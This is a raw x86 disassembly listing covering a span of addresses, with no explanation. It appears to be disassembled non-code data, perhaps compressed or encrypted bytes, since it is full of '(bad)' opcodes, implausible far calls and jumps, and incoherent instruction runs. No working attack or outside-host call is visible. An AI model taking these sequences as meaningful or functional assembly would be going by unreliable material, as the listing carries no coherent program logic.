  40d4bd:	fidiv  DWORD PTR [ebx+0x5a]
  40d4c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4c1:	and    eax,ebp
  40d4c3:	sub    al,0xea
  40d4c5:	test   eax,0x3e1d6553
  40d4ca:	cwde   
  40d4cb:	cdq    
  40d4cc:	or     al,0x4e
  40d4ce:	and    BYTE PTR [edx+ebx*8+0x1],dl
  40d4d2:	retf   0xeede
  40d4d5:	cs jno 0x40d4a6
  40d4d8:	cmp    al,0x38
  40d4da:	repz or BYTE PTR [bp+si+0x3c],0xe0
  40d4e0:	adc    BYTE PTR [ecx],dl
  40d4e2:	push   ebx
  40d4e3:	or     eax,0xc1f0c7b1
  40d4e8:	out    dx,eax
  40d4e9:	sbb    BYTE PTR [ebx],ah
  40d4eb:	add    ch,bl
  40d4ed:	loop   0x40d499
  40d4ef:	fimul  DWORD PTR [ecx-0x6f]
  40d4f2:	in     al,0x9d
  40d4f4:	cmp    ah,cl
  40d4f6:	cld    
  40d4f7:	mov    eax,ds:0xc449a87a
  40d4fc:	xchg   ecx,esp
  40d4fe:	ret    0xa700
  40d501:	es mov edi,0xa19a8a13
  40d507:	or     dh,BYTE PTR [eax-0x72e678a4]
  40d50d:	and    cl,BYTE PTR [eax-0x45627a5e]
  40d513:	jo     0x40d49c
  40d515:	inc    esp
  40d516:	push   0x22625926
  40d51b:	push   0x2
  40d51d:	jne    0x40d56f
  40d51f:	fimul  DWORD PTR [edx]
  40d521:	les    edx,FWORD PTR [edx+0x1cd2abff]
  40d527:	sbb    eax,DWORD PTR [edi+esi*1-0x47]
  40d52b:	ss push 0x21
  40d52e:	xchg   ebx,eax
  40d52f:	mov    ah,0x5b
  40d531:	and    DWORD PTR [ecx],edx
  40d533:	pop    esp
  40d534:	enter  0x3797,0x9e
  40d538:	imul   DWORD PTR [ecx]
  40d53a:	or     ebx,DWORD PTR [eax-0x61a7e9e7]
  40d540:	xor    eax,0xa4d4a92d
  40d545:	xchg   ebp,eax
  40d546:	and    eax,DWORD PTR [edx-0x71]
  40d549:	into   
  40d54a:	jecxz  0x40d588
  40d54c:	(bad)  
  40d54d:	fcmovbe st,st(0)
  40d54f:	cdq    
  40d550:	or     BYTE PTR [esi+0x641e4320],ah
  40d556:	aam    0x70
  40d558:	xlat   BYTE PTR ss:[ebx]
  40d55a:	cmp    DWORD PTR [esi+edx*8-0x311a19a4],0x33
  40d562:	call   0xbc83:0xb9f37c49
  40d569:	nop
  40d56a:	packssdw mm4,QWORD PTR [esi+eax*8+0x7ea400e7]
  40d572:	(bad)  
  40d573:	ins    BYTE PTR es:[edi],dx
  40d574:	xchg   edi,eax
  40d575:	aas    
  40d576:	mov    eax,0x8c4d4ce2
  40d57b:	sbb    eax,0xcbb18bb6
  40d580:	inc    ebp
  40d581:	js     0x40d5ee
  40d583:	xor    DWORD PTR [edx],esi
  40d585:	aaa    
  40d586:	push   ebp
  40d587:	push   eax
  40d588:	add    al,0xf
  40d58a:	jo     0x40d50e
  40d58c:	adc    al,0x5e
  40d58e:	mov    ds:0xcb2f4ec5,al
  40d593:	cmp    BYTE PTR [eax+0x1fc6a954],bh
  40d599:	cmp    DWORD PTR [edi-0xb],esi
  40d59c:	push   esp
  40d59d:	xor    dl,bl
  40d59f:	repz mov edx,0x14037ac8
  40d5a5:	ds arpl dx,ax
  40d5a8:	sub    ah,dh
  40d5aa:	stc    
  40d5ab:	push   cs
  40d5ac:	ds jns 0x40d595
  40d5af:	arpl   WORD PTR [edi-0x6d],dx
  40d5b2:	out    0x4,eax
  40d5b4:	scas   al,BYTE PTR es:[edi]
  40d5b5:	js     0x40d5d8
  40d5b7:	cmp    al,BYTE PTR [ebx+0x41]
  40d5ba:	mov    DWORD PTR [eax-0x60],edi
  40d5bd:	fstp   DWORD PTR [eax+ecx*1+0x2b19183d]
  40d5c4:	push   0xcc725580
  40d5c9:	call   0xac32:0xc54e0cf9
  40d5d0:	push   esp
  40d5d1:	cmp    edx,ebp
  40d5d3:	in     al,0x92
  40d5d5:	loop   0x40d55d
  40d5d7:	mov    eax,0x3c9f656b
  40d5dc:	inc    ebx
  40d5dd:	cli    
  40d5de:	dec    esp
  40d5df:	cmp    dh,bh
  40d5e1:	pop    ds
  40d5e2:	lea    edi,[eax-0x1e4a7965]
  40d5e8:	mov    esi,0xaa206d4f
  40d5ed:	es adc al,0x27
  40d5f0:	xchg   DWORD PTR [ecx],edi
  40d5f2:	mov    ecx,0xd0ec2083
  40d5f7:	dec    ebx
  40d5f8:	addr16 dec edx
  40d5fa:	jge    0x40d5ab
  40d5fc:	jns    0x40d5fc
  40d5fe:	ja     0x40d600
  40d600:	out    0x4f,al
  40d602:	out    0x43,al
  40d604:	pop    edx
  40d605:	add    al,0xaa
  40d607:	rol    BYTE PTR [edi],0x83
  40d60a:	into   
  40d60b:	cmp    BYTE PTR [edx+0x27a47b16],ch
  40d611:	pop    edi
  40d612:	test   DWORD PTR [edx-0x6b316e9f],edx
  40d618:	arpl   WORD PTR [edx+0x77],bx
  40d61b:	pop    esi
  40d61c:	dec    ebx
  40d61d:	imul   edi,DWORD PTR [ebx+0x7b681b22],0x8085be5a
  40d627:	sti    
  40d628:	inc    edi
  40d629:	scas   al,BYTE PTR es:[edi]
  40d62a:	pusha  
  40d62b:	imul   ebx,DWORD PTR [esi+0x43],0xd1e58bf2
  40d632:	sbb    dl,BYTE PTR [esi]
  40d634:	xchg   edi,eax
  40d635:	arpl   si,sp
  40d637:	daa    
  40d638:	mov    edx,0x23d42c95
  40d63d:	cmp    edx,DWORD PTR [ebx]
  40d63f:	leave  
  40d640:	(bad)  
  40d642:	xchg   DWORD PTR [ebp-0x73],ebx
  40d645:	push   esi
  40d646:	pop    ebx
  40d647:	cwde   
  40d648:	ret    0xd1d8
  40d64b:	dec    esi
  40d64c:	repz inc edx
  40d64e:	sbb    BYTE PTR [ecx-0x51],0x3e
  40d652:	and    ecx,esi
  40d654:	mov    WORD PTR [esi-0x2c598660],?
  40d65a:	add    al,0xcd
  40d65c:	test   al,0x1c
  40d65e:	or     DWORD PTR [eax],eax
  40d660:	or     edx,ebx
  40d662:	sbb    eax,0xf1bcb2e0
  40d667:	or     edx,DWORD PTR [edx-0x6b35d11a]
  40d66d:	xchg   esp,eax
  40d66e:	pop    edi
  40d66f:	push   ebx
  40d670:	mov    DWORD PTR [edx-0x47],ecx
  40d673:	enter  0x4ebd,0x58
  40d677:	jmp    0x7284019e
  40d67c:	sbb    al,0x2f
  40d67e:	lea    edi,[ebp+ebp*8-0x5]
  40d682:	jmp    0x8139402e
  40d687:	fnstenv [ecx+0x20b78248]
  40d68d:	sub    eax,0xe002c651
  40d692:	retf   
  40d693:	sub    al,0xa7
  40d695:	or     edx,DWORD PTR [edx-0x7a]
  40d698:	cli    
  40d699:	mov    ?,WORD PTR [esi]
  40d69b:	add    eax,0xdb4b6f76
  40d6a0:	scas   al,BYTE PTR es:[edi]
  40d6a1:	push   ebx
  40d6a2:	mov    ecx,0x20167af9
  40d6a7:	mov    WORD PTR [esi-0x59],?
  40d6aa:	xchg   DWORD PTR [eax+0x4],esi
  40d6ad:	repnz in al,0xd4
  40d6b0:	psadbw mm4,QWORD PTR [ecx-0x1c496e06]
  40d6b7:	cmp    DWORD PTR es:[edx+0x1fde9cd7],esi
  40d6be:	push   ebp
  40d6bf:	push   ebp
  40d6c0:	jne    0x40d6db
  40d6c2:	les    esi,FWORD PTR [edi+0x7e]
  40d6c5:	jecxz  0x40d739
  40d6c7:	fs inc esp
  40d6c9:	adc    DWORD PTR [eax+0x67],ecx
  40d6cc:	lock dec esp
  40d6ce:	xlat   BYTE PTR ds:[ebx]
  40d6cf:	mov    BYTE PTR [edi+edi*8-0x567e959b],bl
  40d6d6:	stc    
  40d6d7:	and    bl,BYTE PTR [edi+0x7a13cae4]
  40d6dd:	xor    DWORD PTR [ebp+edx*8-0x14],esi
  40d6e1:	inc    edx
  40d6e2:	and    eax,0x6b9e4f9
  40d6e7:	push   edi
  40d6e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6e9:	cmp    al,0x32
  40d6eb:	popf   
  40d6ec:	js     0x40d725
  40d6ee:	dec    edi
  40d6ef:	mov    eax,0xa0e260f3
  40d6f4:	pop    edx
  40d6f5:	adc    BYTE PTR [esi+0x7b],al
  40d6f8:	push   edx
  40d6f9:	fdiv   QWORD PTR [edx+0x5f]
  40d6fc:	mov    ah,0x1b
  40d6fe:	jl     0x40d761
  40d700:	mov    dl,0x46
  40d702:	mov    dh,0xb3
  40d704:	push   esp
  40d705:	nop
  40d706:	std    
  40d707:	dec    ecx
  40d708:	adc    eax,0xc2febfb3
  40d70d:	lea    ebp,[ebx+edi*4]
  40d710:	mov    ds:0x1928a545,al
  40d715:	shl    BYTE PTR [edi+esi*8],cl
  40d718:	ins    DWORD PTR es:[edi],dx
  40d719:	dec    eax
  40d71a:	cmc    
  40d71b:	dec    edi
  40d71c:	imul   ecx,esi,0x6e
  40d71f:	inc    esp
  40d720:	adc    DWORD PTR [ecx-0x4e],esp
  40d723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d724:	jl     0x40d6c8
  40d726:	xor    eax,0xb70bae91
  40d72b:	mov    eax,ds:0x4b9c43bf
  40d730:	mov    dh,0x95
  40d732:	ds ja  0x40d6cb
  40d735:	xchg   edx,eax
  40d736:	xchg   BYTE PTR [edi+0x26],dh
  40d739:	xchg   ecx,eax
  40d73a:	aam    0xc0
  40d73c:	adc    cl,BYTE PTR [ebp+0x12]
  40d73f:	xor    BYTE PTR [edi],bh
  40d741:	test   al,0xc9
  40d743:	push   esi
  40d744:	cmp    dl,bh
  40d746:	imul   edi,DWORD PTR [eax+edi*4-0x10],0xffffffa5
  40d74b:	cmp    DWORD PTR [edx+ecx*2+0x15da8ae1],ecx
  40d752:	or     ch,ch
  40d754:	ror    BYTE PTR [edi],0x4d
  40d757:	jecxz  0x40d6f6
  40d759:	rcr    DWORD PTR [edi+0x7184d61b],1
  40d75f:	pop    edi
  40d760:	js     0x40d76c
  40d762:	xchg   edi,eax
  40d763:	(bad)  
  40d764:	aad    0x8a
  40d766:	add    edi,0x7a8789e2
  40d76c:	jl     0x40d71f
  40d76e:	xlat   BYTE PTR ds:[ebx]
  40d76f:	call   0x2264b8b
  40d774:	inc    esi
  40d775:	push   esi
  40d776:	add    al,0xb2
  40d778:	je     0x40d732
  40d77a:	mov    edi,0x2be40edd
  40d77f:	xchg   esi,eax
  40d780:	daa    
  40d781:	idiv   eax
  40d783:	retf   
  40d784:	mov    dh,0x44
  40d786:	sbb    BYTE PTR [ebx+0x6e],0x10
  40d78a:	or     eax,0x2383124f
  40d78f:	dec    esp
  40d790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d791:	pop    edx
  40d792:	jmp    0x40d74d
  40d794:	sar    DWORD PTR [eax+0x6bd0e1a6],1
  40d79a:	xor    eax,0x982efacc
  40d79f:	aaa    
  40d7a0:	loopne 0x40d726
  40d7a2:	sar    DWORD PTR [eax-0x4f],1
  40d7a5:	sub    al,0x52
  40d7a7:	jp     0x40d73d
  40d7a9:	aas    
  40d7aa:	jmp    0x5602f880
  40d7af:	or     BYTE PTR [ecx+0x4e],bl
  40d7b2:	call   0x6e32b012
  40d7b7:	jp     0x40d7b6
  40d7b9:	std    
  40d7ba:	fwait
  40d7bb:	nop
  40d7bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7bd:	push   ebp
  40d7be:	mov    edx,0xcfa24536
  40d7c3:	mov    bl,0x6d
  40d7c5:	cmp    DWORD PTR [edx],ecx
  40d7c7:	in     eax,0xa8
  40d7c9:	push   cs
  40d7ca:	or     eax,0x759e21b3
  40d7cf:	push   esi
  40d7d0:	mov    ebp,0xe75e2b07
  40d7d5:	add    BYTE PTR [eax],ah
  40d7d7:	jmp    0x40d77f
  40d7d9:	stos   BYTE PTR es:[edi],al
  40d7da:	sub    BYTE PTR [eax+edi*8-0x22],ah
  40d7de:	jp     0x40d7dd
  40d7e0:	sbb    edi,ecx
  40d7e2:	enter  0x3a81,0x1d
  40d7e6:	jnp    0x40d81f
  40d7e8:	aam    0x7b
  40d7ea:	xchg   DWORD PTR [ebx+0x4ce7080e],ecx
  40d7f0:	shr    ch,0x24
  40d7f3:	ret    
  40d7f4:	(bad)  
  40d7f5:	xchg   esi,eax
  40d7f6:	out    0x2,al
  40d7f8:	mov    ds:0x2fe99048,al
  40d7fd:	(bad)  [eax]
  40d7ff:	add    al,BYTE PTR [ebx+0x1]
  40d802:	xlat   BYTE PTR ds:[ebx]
  40d803:	js     0x40d870
  40d805:	mov    edi,0xc91587ef
  40d80b:	(bad)  
  40d80c:	mov    dl,0xba
  40d80e:	xchg   ebx,eax
  40d80f:	shr    DWORD PTR [esi],0xb7
  40d812:	fld    QWORD PTR [edx+0x5f9e52f9]
  40d818:	fucomip st,st(3)
  40d81a:	xchg   DWORD PTR [ebx-0x46],esp
  40d81d:	adc    al,0x5e
  40d81f:	pavgw  mm6,QWORD PTR [ecx-0x19]
  40d823:	fwait
  40d824:	mov    ds:0xc67279e9,eax
  40d829:	pushf  
  40d82a:	pusha  
  40d82b:	ins    BYTE PTR es:[edi],dx
  40d82c:	xchg   esi,eax
  40d82d:	inc    ecx
  40d82e:	pop    ebx
  40d82f:	in     eax,dx
  40d830:	pop    ds
  40d831:	ins    BYTE PTR es:[edi],dx
  40d832:	scas   al,BYTE PTR es:[edi]
  40d833:	fisub  DWORD PTR [edx-0x2d3dc845]
  40d839:	ins    BYTE PTR es:[edi],dx
  40d83a:	jns    0x40d811
  40d83c:	or     al,0xf2
  40d83e:	leave  
  40d83f:	fist   WORD PTR [edi-0x2a3ed327]
  40d845:	jns    0x40d800
  40d847:	jle    0x40d81c
  40d849:	ds dec ecx
  40d84b:	xor    DWORD PTR [edx],esp
  40d84d:	into   
  40d84e:	ins    BYTE PTR es:[edi],dx
  40d84f:	mov    ch,0xf3
  40d851:	mov    ah,0x1c
  40d853:	imul   esp,DWORD PTR [esi-0x6cd016a8],0x5ebe1c9a
  40d85d:	into   
  40d85e:	fstp   DWORD PTR [esi]
  40d860:	retf   
  40d861:	fnstcw WORD PTR [eax+ecx*1-0x2]
  40d865:	ret    
  40d866:	out    0x8e,eax
  40d868:	sub    ch,dh
  40d86a:	retf   
  40d86b:	push   ecx
  40d86c:	cwde   
  40d86d:	jne    0x40d7fe
  40d86f:	mov    edi,0xbe373e90
  40d874:	mov    edx,DWORD PTR [eax-0x34]
  40d877:	mov    esp,0xa30a9ce4
  40d87c:	dec    edi
  40d87d:	arpl   WORD PTR [ebx-0x30],di
  40d880:	imul   ecx,DWORD PTR [eax],0x541ece73
  40d886:	and    al,0x3f
  40d888:	mov    cl,0xef
  40d88a:	push   ecx
  40d88b:	repnz stc 
  40d88d:	aas    
  40d88e:	inc    ebp
  40d88f:	mov    es,WORD PTR [ecx+0x670f71fb]
  40d895:	sub    cl,ah
  40d897:	mov    cl,BYTE PTR [ebx]
  40d899:	sti    
  40d89a:	or     ecx,DWORD PTR [ebp+0x1f]
  40d89d:	fidivr WORD PTR [edx-0x678903c8]
  40d8a3:	lods   al,BYTE PTR ds:[esi]
  40d8a4:	cmp    DWORD PTR [edi-0x6],edi
  40d8a7:	adc    al,0x0
  40d8a9:	push   ebp
  40d8aa:	popf   
  40d8ab:	hlt    
  40d8ac:	push   edi
  40d8ad:	out    0x74,al
  40d8af:	out    dx,eax
  40d8b0:	xchg   ecx,eax
  40d8b1:	and    ecx,DWORD PTR [eax]
  40d8b3:	xor    cl,BYTE PTR [ebx+0x6041e9c8]
  40d8b9:	jne    0x40d917
  40d8bb:	push   DWORD PTR [ecx]
  40d8bd:	stos   BYTE PTR es:[edi],al
  40d8be:	mov    edx,0xc85ad73
  40d8c3:	fild   QWORD PTR [edx-0x721706eb]
  40d8c9:	das    
  40d8ca:	xchg   edx,eax
  40d8cb:	add    cl,ah
  40d8cd:	push   edi
  40d8ce:	xchg   DWORD PTR [edx],esi
  40d8d0:	jo     0x40d8d6
  40d8d2:	idiv   ecx
  40d8d4:	int3   
  40d8d5:	loope  0x40d87a
  40d8d7:	(bad)  
  40d8d8:	ror    DWORD PTR [edi+eiz*4-0x5e],1
  40d8dc:	cdq    
  40d8dd:	mov    dh,0xa3
  40d8df:	pop    eax
  40d8e0:	popf   
  40d8e1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40d8e3:	ins    DWORD PTR es:[edi],dx
  40d8e4:	sbb    BYTE PTR [ebp-0x1b],0xe6
  40d8e8:	clc    
  40d8e9:	adc    al,0x87
  40d8eb:	mul    BYTE PTR ds:0x49983d27
  40d8f1:	pop    esi
  40d8f2:	in     al,0xb6
  40d8f4:	pop    edx
  40d8f5:	dec    edi
  40d8f6:	xor    esp,ebx
  40d8f8:	mov    dh,0xdf
  40d8fa:	pop    ds
  40d8fb:	jb     0x40d8bd
  40d8fd:	test   DWORD PTR [esi],esi
  40d8ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d900:	outs   dx,BYTE PTR ds:[esi]
  40d901:	xor    ah,BYTE PTR [esp+ebp*8]
  40d904:	jecxz  0x40d8e2
  40d906:	out    0x41,eax
  40d908:	neg    ebx
  40d90a:	jmp    DWORD PTR [ebp+0x7a]
  40d90d:	loope  0x40d98b
  40d90f:	add    eax,0xa1671159
  40d914:	ret    
  40d915:	ds push esi
  40d917:	add    dl,BYTE PTR [edx+0x5d1d3e3f]
  40d91d:	inc    esi
  40d91e:	outs   dx,BYTE PTR ds:[esi]
  40d91f:	xor    ebp,DWORD PTR cs:[edx+edi*4]
  40d923:	neg    BYTE PTR [esi+0x4f]
  40d926:	mov    BYTE PTR [edi+edx*1+0x66],0x6e
  40d92b:	pop    ds
  40d92c:	mov    ecx,0x22f126b1
  40d931:	enter  0xa638,0x8d
  40d935:	fs call esi
  40d938:	dec    eax
  40d939:	push   ss
  40d93a:	push   edx
  40d93b:	out    0x1a,al
  40d93d:	xchg   edi,eax
  40d93e:	ror    BYTE PTR [eax+0x62],1
  40d941:	sub    DWORD PTR [eax+ecx*2-0x31d1d736],ecx
  40d948:	imul   edi,ebx,0xffffff94
  40d94b:	inc    ecx
  40d94c:	and    eax,0x567489bd
  40d951:	mov    bh,0x3f
  40d953:	mov    dh,0x7e
  40d955:	xchg   ebp,eax
  40d956:	jnp    0x40d92c
  40d958:	push   ds
  40d959:	outs   dx,DWORD PTR ds:[esi]
  40d95a:	rcr    BYTE PTR [edx+0x42],1
  40d95d:	sub    ebx,edx
  40d95f:	(bad)
  40d962:	or     al,0x4d
  40d964:	cmc    
  40d965:	(bad)  
  40d966:	stos   DWORD PTR es:[edi],eax
  40d967:	pop    ebp
  40d968:	(bad)  
  40d969:	mov    BYTE PTR [ebp+0x5ca12453],bl
  40d96f:	fbld   TBYTE PTR [edi+0x6d60ad54]
  40d975:	rol    edx,cl
  40d977:	scas   al,BYTE PTR es:[edi]
  40d978:	push   ebp
  40d979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d97a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d97b:	mov    dl,0x29
  40d97d:	into   
  40d97e:	sbb    dl,0x50
  40d981:	out    dx,eax
  40d982:	pop    ss
  40d983:	jbe    0x40d931
  40d985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d986:	inc    esi
  40d987:	push   0x57
  40d989:	adc    ecx,DWORD PTR [ebp-0x3e25035a]
  40d98f:	inc    ebp
  40d990:	add    eax,0x8bb1ea03
  40d995:	call   0x47e1:0x31b8b5bc
  40d99c:	dec    ebp
  40d99d:	xchg   edx,eax
  40d99e:	out    dx,eax
  40d99f:	jmp    0xd249:0x62325f5e
  40d9a6:	dec    esi
  40d9a7:	mov    WORD PTR [ecx-0x9],cs
  40d9aa:	in     al,0x31
  40d9ac:	outs   dx,DWORD PTR ds:[esi]
  40d9ad:	pop    ebp
  40d9ae:	add    ah,BYTE PTR [ebx+0x1a]
  40d9b1:	cmp    al,0xd4
  40d9b3:	clc    
  40d9b4:	mov    esi,0x218a0cbb
  40d9b9:	int    0xe2
  40d9bb:	mov    ecx,0x67e65880
  40d9c0:	aaa    
  40d9c1:	inc    edx
  40d9c2:	outs   dx,DWORD PTR ds:[esi]
  40d9c3:	fwait
  40d9c4:	xchg   ebp,eax
  40d9c5:	pop    esp
  40d9c6:	pop    ebx
  40d9c7:	sahf   
  40d9c8:	xor    esp,DWORD PTR [ebp+edx*2+0xc]
  40d9cc:	mov    ebp,0xd2f5c319
  40d9d1:	cmp    al,0x41
  40d9d3:	bound  ecx,QWORD PTR [ecx]
  40d9d5:	xchg   ebx,eax
  40d9d6:	test   al,0x36
  40d9d8:	not    DWORD PTR [ecx]
  40d9da:	mov    eax,ds:0x528c8980
  40d9df:	pop    edx
  40d9e0:	xchg   ecx,eax
  40d9e1:	jmp    0xf10815a3
  40d9e6:	jmp    0xf122:0xb069c5e5
  40d9ed:	cdq    
  40d9ee:	jne    0x40d9b6
  40d9f0:	push   edi
  40d9f1:	sbb    BYTE PTR [ecx],0x5d
  40d9f4:	inc    esp
  40d9f5:	add    DWORD PTR [edx],esi
  40d9f7:	mov    bh,0x63
  40d9f9:	mov    edi,0x6159f00
  40d9fe:	in     al,0x21
  40da00:	mov    ch,0x2e
  40da02:	cmp    eax,0x5f746d06
  40da07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da08:	sub    eax,ecx
  40da0a:	fs sub al,0x99
  40da0d:	jp     0x40d9ec
  40da0f:	push   ss
  40da10:	push   ds
  40da11:	arpl   di,dx
  40da13:	addr16 nop
  40da15:	std    
  40da16:	jne    0x40da2b
  40da18:	push   eax
  40da19:	push   edx
  40da1a:	xchg   esp,eax
  40da1b:	and    edi,edi
  40da1d:	jg     0x40d9e4
  40da1f:	mov    edx,0xb1833a68
  40da24:	popa   
  40da25:	daa    
  40da26:	xchg   edi,eax
  40da27:	xchg   edx,eax
  40da28:	adc    DWORD PTR [eax],esi
  40da2a:	pushf  
  40da2b:	outs   dx,BYTE PTR ds:[esi]
  40da2c:	popa   
  40da2d:	das    
  40da2e:	pop    esi
  40da2f:	dec    ecx
  40da30:	mov    ebp,0xdbeeb101
  40da35:	ds pop ebx
  40da37:	shl    bh,1
  40da39:	push   es
  40da3a:	fs test al,0xf9
  40da3d:	popa   
  40da3e:	and    DWORD PTR [esi],edi
  40da40:	fild   QWORD PTR [ebp-0x51]
  40da43:	sahf   
  40da44:	and    al,0xaa
  40da46:	ja     0x40da47
  40da48:	inc    ebp
  40da49:	mov    BYTE PTR [edx],dh
  40da4b:	ficomp WORD PTR [eax*2+0x66723480]
  40da52:	daa    
  40da53:	add    al,0x14
  40da55:	xor    al,0x0
  40da57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da58:	mov    edi,0x1411539a
  40da5d:	stos   BYTE PTR es:[edi],al
  40da5e:	jl     0x40da8f
  40da60:	sbb    eax,0x481c7bb0
  40da65:	inc    eax
  40da66:	adc    BYTE PTR [ebp-0x7e],cl
  40da69:	mov    ecx,0xc69f57e4
  40da6e:	mov    al,ds:0xa3fd3d
  40da73:	mov    dh,0x10
  40da75:	cli    
  40da76:	and    eax,eax
  40da78:	xor    al,BYTE PTR [edx]
  40da7a:	sbb    DWORD PTR [eax+0x2e],esi
  40da7d:	inc    ebx
  40da7e:	ffreep st(6)
  40da80:	outs   dx,BYTE PTR ds:[esi]
  40da81:	mov    ah,0x28
  40da83:	jp     0x40dacb
  40da85:	mov    bh,0x0
  40da87:	jp     0x40daa7
  40da89:	imul   ebx,DWORD PTR [esi],0x790739a1
  40da8f:	cmp    ch,BYTE PTR [ebx-0x39]
  40da92:	jb     0x40daca
  40da94:	sbb    eax,0x320b7d9b
  40da99:	sub    DWORD PTR [edx-0x17cdee2],esp
  40da9f:	aad    0x58
  40daa1:	clc    
  40daa2:	pusha  
  40daa3:	(bad)  
  40daa4:	push   esp
  40daa5:	ror    DWORD PTR [ebp+0x60],cl
  40daa8:	test   DWORD PTR [ebx+0x16],ebx
  40daab:	mov    eax,ds:0xdef3fe0c
  40dab0:	dec    esi
  40dab1:	inc    esi
  40dab2:	cmp    edi,DWORD PTR ds:0x3369c494
  40dab8:	sahf   
  40dab9:	bound  edi,QWORD PTR [eax]
  40dabb:	daa    
  40dabc:	and    DWORD PTR [edi+0x1967e3d4],esp
  40dac2:	aaa    
  40dac3:	jns    0x40daa1
  40dac5:	call   0x22a2:0xb062daa
  40dacc:	test   cl,ah
  40dace:	push   ebp
  40dacf:	(bad)  
  40dad0:	push   esi
  40dad1:	pop    ecx
  40dad2:	popa   
  40dad3:	mov    ebx,0x521bcc28
  40dad8:	(bad)  
  40dad9:	fnstcw WORD PTR [esi+edx*4+0x1556cdc]
  40dae0:	cld    
  40dae1:	dec    edx
  40dae2:	out    0xb,eax
  40dae4:	sub    dh,BYTE PTR [edi+ebx*8+0x1b]
  40dae8:	jo     0x40db44
  40daea:	xchg   esi,eax
  40daeb:	and    al,0xca
  40daed:	shl    edx,cl
  40daef:	js     0x40da88
  40daf1:	sbb    DWORD PTR [edx],esi
  40daf3:	inc    eax
  40daf4:	adc    al,0x2
  40daf6:	mov    edx,0x5eafb005
  40dafb:	cdq    
  40dafc:	mov    ecx,0x5bdde660
  40db01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db02:	cmp    DWORD PTR [esi-0x24],eax
  40db05:	sub    DWORD PTR [eax+eiz*4-0x1eb23f2],eax
  40db0c:	stos   DWORD PTR es:[edi],eax
  40db0d:	mov    bl,0xc2
  40db0f:	retf   
  40db10:	sti    
  40db11:	dec    esi
  40db12:	cmp    al,0xb0
  40db14:	call   0x885f:0x5e84c8d8
  40db1b:	dec    edx
  40db1c:	adc    bl,BYTE PTR [eax]
  40db1e:	and    bl,BYTE PTR [ecx-0xb]
  40db21:	adc    al,0xaa
  40db23:	mov    DWORD PTR [eax+ecx*2-0x31],esp
  40db27:	and    al,0xd3
  40db29:	loop   0x40dae3
  40db2b:	test   al,0x68
  40db2d:	push   edx
  40db2e:	sbb    BYTE PTR [eax],dl
  40db30:	xor    BYTE PTR [ebx-0x2e],ah
  40db33:	cmp    eax,0x551738f8
  40db38:	adc    al,0x3
  40db3a:	push   edx
  40db3b:	loopne 0x40db31
  40db3d:	inc    edi
  40db3e:	jne    0x40db2e
  40db40:	repnz aam 0xbd
  40db43:	jmp    0x40dae5
  40db45:	out    dx,eax
  40db46:	add    ch,BYTE PTR [eax-0x13acd94a]
  40db4c:	mov    ds:0xc86d3a33,eax
  40db51:	jg     0x40db77
  40db53:	push   ecx
  40db54:	loopne 0x40daf5
  40db56:	pop    ebx
  40db57:	xor    eax,DWORD PTR [esi+0x4a]
  40db5a:	or     dl,BYTE PTR [esi-0x58]
  40db5d:	popf   
  40db5e:	sbb    BYTE PTR [edx],dl
  40db60:	and    BYTE PTR [ebp-0x3d],0x53
  40db64:	dec    edi
  40db65:	(bad)  
  40db66:	cmp    BYTE PTR [ecx+ebx*2-0x2aade04f],dh
  40db6d:	inc    edi
  40db6e:	sub    esp,edi
  40db70:	xor    eax,0x65413c67
  40db75:	dec    esp
  40db76:	or     dl,BYTE PTR [edi]
  40db78:	xor    eax,0xcd01c404
  40db7d:	inc    ecx
  40db7e:	push   es
  40db7f:	fdivr  DWORD PTR [ebx-0x4702ff3a]
  40db85:	mov    edi,0xf20f9238
  40db8a:	pop    ebx
  40db8b:	lods   eax,DWORD PTR ds:[esi]
  40db8c:	push   ecx
  40db8d:	xor    al,0xfe
  40db8f:	aas    
  40db90:	pop    ecx
  40db91:	(bad)  [esi+0x3a]
  40db94:	dec    esp
  40db95:	mov    bh,0x62
  40db97:	mov    ds:0x5e4d541e,eax
  40db9c:	sbb    bh,dh
  40db9e:	cmp    BYTE PTR [esi+0x51],al
  40dba1:	cmc    
  40dba2:	xlat   BYTE PTR ds:[ebx]
  40dba3:	xchg   ebp,eax
  40dba4:	mov    ebp,0x26e2451b
  40dba9:	loope  0x40db7d
  40dbab:	pushf  
  40dbac:	les    esi,FWORD PTR [ebx-0x2]
  40dbaf:	adc    BYTE PTR [ecx],0xa6
  40dbb2:	jnp    0x40dc24
  40dbb4:	cmp    esi,DWORD PTR [edx+0x14ba5512]
  40dbba:	push   cs
  40dbbb:	aas    
  40dbbc:	test   DWORD PTR [ecx+0x1c722172],ebp
  40dbc2:	xor    edx,DWORD PTR [ecx]
  40dbc4:	(bad)  
  40dbc5:	cmp    esp,DWORD PTR [esi+edx*4]
  40dbc8:	or     dh,BYTE PTR [edi-0x1d2ca26b]
  40dbce:	sbb    al,0xb5
  40dbd0:	sahf   
  40dbd1:	and    DWORD PTR [edx-0x3a],edx
  40dbd4:	push   ss
  40dbd5:	xchg   esp,eax
  40dbd6:	js     0x40dbc7
  40dbd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbd9:	jb     0x40dbbf
  40dbdb:	nop
  40dbdc:	dec    edx
  40dbdd:	repz inc ebx
  40dbdf:	stos   DWORD PTR es:[edi],eax
  40dbe0:	cmp    al,0x2c
  40dbe2:	repz pop ecx
  40dbe4:	retf   
  40dbe5:	test   al,0x27
  40dbe7:	xor    ebp,DWORD PTR ds:0x365596f4
  40dbed:	adc    al,0x49
  40dbef:	dec    edx
  40dbf0:	sbb    eax,DWORD PTR [eax]
  40dbf2:	jns    0x40dc39
  40dbf4:	retf   0xc3
  40dbf7:	add    BYTE PTR [esp+edi*4+0x31181a00],ah
  40dbfe:	jno    0x40dc12
  40dc00:	add    ebx,DWORD PTR [edx+0x33a8deba]
